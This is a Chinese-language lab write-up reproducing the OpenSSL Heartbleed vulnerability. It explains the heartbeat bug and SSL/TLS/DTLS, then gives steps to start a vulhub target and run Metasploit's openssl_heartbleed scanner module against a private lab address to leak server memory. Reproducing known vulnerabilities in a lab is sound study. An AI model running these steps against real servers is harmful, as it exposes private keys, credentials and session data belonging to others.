2014年4月7日，OpenSSL发布安全公告，在OpenSSL1.0.1版本至OpenSSL1.0.1f
Beta1版本中存在漏洞，该漏洞中文名称为心脏滴血，英文名称为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。

利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。

## 漏洞范围

OpenSSL 1.0.1版本

ssl、tls、dtls介绍

在网络当中中，TCP/IP协议层之上的安全可以由Secure Socket Layer(SSL)及其替代协议Transport Layer Security
(TLS)进行保障。这两个协议经常被称作SSL/TLS。HTTP是一个无状态的应用层协议，主要用来在服务器和客户端之间传输数据。HTTPS主要通过在HTTP层和TCP层之间增加了SSL/TLS层来保证服务器与客户端之间安全的传输数据。

DTLS(Datagram Transport Layer
Security)即数据包传输层安全性协议，主要是试图在TLS协议架构上提出扩展，使之支持UDP。

TLS/DTLS中的心跳协议主要使用来检测两个设备之间是否还有连接的，根据RFC规定，心跳协议运行在TLS记录层之上，主要是通过交换“心跳”的方式，用来维持端与端之间的连接。

## 环境搭建：

搭建环境：Ubuntu20.04.2=>192.168.43.246

攻击：kali msf模块

1、首先进入vulhub的heartbleed文件

![](https://image.3001.net/images/20210824/1629789004_61249b4cb979f730ddd29.png!small)

2、搭建靶场

![](https://image.3001.net/images/20210824/1629789017_61249b5986a0d5cf18c94.png!small)

3、查看靶场地址并且用kali ping一下

![](https://image.3001.net/images/20210824/1629789027_61249b6323c7adcd4e784.png!small)

![](https://image.3001.net/images/20210824/1629789052_61249b7c7801c562971ba.png!small)

发现地址为192.168.43.246

4、启动msf模块进行攻击

(1)先查找heartbleed模块

![](https://image.3001.net/images/20210824/1629789069_61249b8d33f943b2d40cb.png!small)

（2）use auxiliary/scanner/ssl/openssl_heartbleed

![](https://image.3001.net/images/20210824/1629789077_61249b95af40b797528eb.png!small)

(3)设置参数

Show options

->set RHOST 192.168.43.246

->set RPROT 80

->set verbose true #(设置verbose，这个设置要设置成true才能看到泄露的信息)

（4）run 或者exploit

![](https://image.3001.net/images/20210824/1629789087_61249b9f60aa1ff5d097a.png!small)

![](https://image.3001.net/images/20210824/1629789117_61249bbdbf9774d0e8bae.png!small)

复现成功。

